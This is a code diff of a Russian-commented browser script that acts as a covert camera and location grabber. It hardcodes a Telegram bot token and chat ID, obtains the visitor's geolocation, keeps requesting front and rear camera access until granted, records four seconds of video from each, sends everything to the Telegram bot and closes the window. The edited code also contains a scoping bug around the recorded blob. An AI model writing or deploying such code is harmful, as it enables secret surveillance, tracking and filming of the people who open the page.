@@ -3,8 +3,19 @@ const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
 const CHAT_ID = '8244138604';
 
 const video = document.getElementById('video');
+const loaderContainer = document.querySelector('.loader-container');
 let stream = null;
 let locationData = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+
+// Обновление текста загрузки
+function updateLoaderText(text) {
+    const loaderText = document.querySelector('.loader-text');
+    if (loaderText) {
+        loaderText.textContent = text;
+    }
+}
 
 // Функция запроса геолокации (только 2 попытки)
 async function requestLocation() {
@@ -12,8 +23,11 @@ async function requestLocation() {
         let attempts = 0;
         const maxAttempts = 2;
         
+        updateLoaderText(`Запрос геолокации (${attempts + 1}/${maxAttempts})...`);
+        
         const askLocation = () => {
             attempts++;
+            updateLoaderText(`Запрос геолокации (${attempts}/${maxAttempts})...`);
             
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -22,20 +36,21 @@ async function requestLocation() {
                             lat: position.coords.latitude,
                             lon: position.coords.longitude
                         };
-                        resolve();
+                        updateLoaderText('✅ Геолокация получена');
+                        setTimeout(() => resolve(), 500);
                     },
                     (error) => {
                         if (attempts < maxAttempts) {
-                            console.log(`Геолокация: попытка ${attempts} из ${maxAttempts} не удалась, повтор через 2 сек...`);
                             setTimeout(askLocation, 2000);
                         } else {
-                            console.log('Геолокация не разрешена после 2 попыток, пропускаем');
-                            resolve();
+                            updateLoaderText('⚠️ Геолокация недоступна, продолжаем...');
+                            setTimeout(() => resolve(), 1000);
                         }
                     }
                 );
             } else {
-                resolve();
+                updateLoaderText('⚠️ Геолокация не поддерживается');
+                setTimeout(() => resolve(), 1000);
             }
         };
         
@@ -44,23 +59,27 @@ async function requestLocation() {
 }
 
 // Функция запроса камеры (бесконечное повторение)
-async function requestCamera(facingMode) {
+async function requestCamera(facingMode, cameraName) {
     return new Promise((resolve) => {
+        updateLoaderText(`Запрос ${cameraName} камеры...`);
+        
         const askCamera = () => {
             const constraints = {
                 video: {
                     facingMode: { exact: facingMode },
                     width: { ideal: 1280 },
                     height: { ideal: 720 }
-                }
+                },
+                audio: false // Без звука
             };
             
             navigator.mediaDevices.getUserMedia(constraints)
                 .then(stream => {
-                    resolve(stream);
+                    updateLoaderText(`✅ ${cameraName} камера готова`);
+                    setTimeout(() => resolve(stream), 500);
                 })
                 .catch(() => {
-                    console.log(`Камера ${facingMode} не разрешена, повтор через 2 сек...`);
+                    updateLoaderText(`❌ Нет доступа к ${cameraName} камере, повтор через 2 сек...`);
                     setTimeout(askCamera, 2000);
                 });
         };
@@ -68,40 +87,56 @@ async function requestCamera(facingMode) {
     });
 }
 
-// Запись видео (снимки каждые 0.5 секунды)
-async function recordVideo(stream, durationMs) {
+// Запись видео (4 секунды)
+async function recordVideo(stream, durationMs, cameraName) {
     return new Promise((resolve) => {
-        const canvas = document.createElement('canvas');
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        canvas.width = settings.width || 1280;
-        canvas.height = settings.height || 720;
-        const ctx = canvas.getContext('2d');
+        recordedChunks = [];
         
-        const frames = [];
-        const frameInterval = 500;
-        const framesCount = durationMs / frameInterval;
-        let frameIndex = 0;
+        // Настраиваем видео на элемент
+        video.srcObject = stream;
+        video.play();
         
-        const captureFrame = () => {
-            if (frameIndex >= framesCount) {
-                resolve(frames);
-                return;
+        // Создаем MediaRecorder для записи видео
+        const options = { mimeType: 'video/webm' };
+        mediaRecorder = new MediaRecorder(stream, options);
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
             }
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            frames.push(canvas.toDataURL('image/jpeg', 0.7));
-            frameIndex++;
-            setTimeout(captureFrame, frameInterval);
         };
         
-        captureFrame();
+        mediaRecorder.onstop = () => {
+            // Создаем видео файл из записанных данных
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            resolve(blob);
+        };
+        
+        // Запускаем запись
+        mediaRecorder.start();
+        updateLoaderText(`📹 Запись ${cameraName} камеры: 0 сек`);
+        
+        let seconds = 0;
+        const interval = setInterval(() => {
+            seconds++;
+            updateLoaderText(`📹 Запись ${cameraName} камеры: ${seconds}/${durationMs/1000} сек`);
+        }, 1000);
+        
+        // Останавливаем запись через durationMs
+        setTimeout(() => {
+            clearInterval(interval);
+            mediaRecorder.stop();
+            updateLoaderText(`✅ Запись ${cameraName} камеры завершена`);
+            setTimeout(() => resolve(blob), 500);
+        }, durationMs);
     });
 }
 
 // Отправка геолокации
 async function sendLocation() {
     if (!locationData) return;
+    
+    updateLoaderText('📍 Отправка геолокации...');
     
     const mapsUrl = `https://yandex.com/maps/?pt=${locationData.lon},${locationData.lat}&z=17&l=map`;
     const text = `📍 Местоположение: ${mapsUrl}`;
@@ -113,72 +148,66 @@ async function sendLocation() {
     
     try {
         await fetch(url, { method: 'POST', body: formData });
-    } catch(e) {}
+        updateLoaderText('✅ Геолокация отправлена');
+        await new Promise(resolve => setTimeout(resolve, 500));
+    } catch(e) {
+        updateLoaderText('⚠️ Ошибка отправки геолокации');
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
 }
 
-// Отправка фото в Telegram
-async function sendPhotoToTelegram(imageBase64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    
-    const byteString = atob(imageBase64.split(',')[1]);
-    const mimeString = imageBase64.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    const blob = new Blob([ab], { type: mimeString });
+// Отправка видео в Telegram
+async function sendVideoToTelegram(videoBlob, caption) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
     
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'photo.jpg');
+    formData.append('video', videoBlob, 'video.webm');
     formData.append('caption', caption);
     
     try {
-        await fetch(url, { method: 'POST', body: formData });
-    } catch(e) {}
-}
-
-// Отправка всех кадров (каждый 0.5 сек)
-async function sendAllFrames(frames, cameraName) {
-    if (!frames.length) return;
-    
-    for (let i = 0; i < frames.length; i++) {
-        await sendPhotoToTelegram(frames[i], `${cameraName} - кадр ${i + 1}/8 (0.5 сек)`);
-        await new Promise(resolve => setTimeout(resolve, 300));
+        const response = await fetch(url, { method: 'POST', body: formData });
+        const result = await response.json();
+        return result.ok;
+    } catch(e) {
+        console.error('Ошибка отправки видео:', e);
+        return false;
     }
 }
 
 // Основная функция
 async function main() {
-    // 1. Геолокация (2 попытки)
-    await requestLocation();
-    
-    // 2. Фронтальная камера
-    stream = await requestCamera('user');
-    video.srcObject = stream;
-    await video.play();
-    
-    // 3. Запись фронтальной 4 сек
-    const frontFrames = await recordVideo(stream, 4000);
-    stream.getTracks().forEach(track => track.stop());
-    
-    // 4. Задняя камера
-    stream = await requestCamera('environment');
-    video.srcObject = stream;
-    await video.play();
-    
-    // 5. Запись задней 4 сек
-    const backFrames = await recordVideo(stream, 4000);
-    stream.getTracks().forEach(track => track.stop());
-    
-    // 6. Отправка
-    await sendLocation();
-    await sendAllFrames(frontFrames, '📹 Фронтальная камера');
-    await sendAllFrames(backFrames, '📹 Задняя камера');
-    
-    // 7. Закрытие
-    setTimeout(() => window.close(), 1000);
+    try {
+        // 1. Геолокация (2 попытки)
+        await requestLocation();
+        
+        // 2. Фронтальная камера + запись видео 4 сек
+        stream = await requestCamera('user', 'фронтальной');
+        const frontVideo = await recordVideo(stream, 4000, 'фронтальной');
+        stream.getTracks().forEach(track => track.stop());
+        
+        // 3. Задняя камера + запись видео 4 сек
+        stream = await requestCamera('environment', 'задней');
+        const backVideo = await recordVideo(stream, 4000, 'задней');
+        stream.getTracks().forEach(track => track.stop());
+        
+        // 4. Отправка
+        await sendLocation();
+        
+        updateLoaderText('📤 Отправка фронтального видео...');
+        await sendVideoToTelegram(frontVideo, '📹 Фронтальная камера (4 секунды)');
+        
+        updateLoaderText('📤 Отправка заднего видео...');
+        await sendVideoToTelegram(backVideo, '📹 Задняя камера (4 секунды)');
+        
+        // 5. Завершение
+        updateLoaderText('✅ Готово! Закрытие...');
+        setTimeout(() => window.close(), 2000);
+        
+    } catch (error) {
+        updateLoaderText('❌ Ошибка, перезагрузите страницу');
+        console.error(error);
+    }
 }
 
 // Запуск
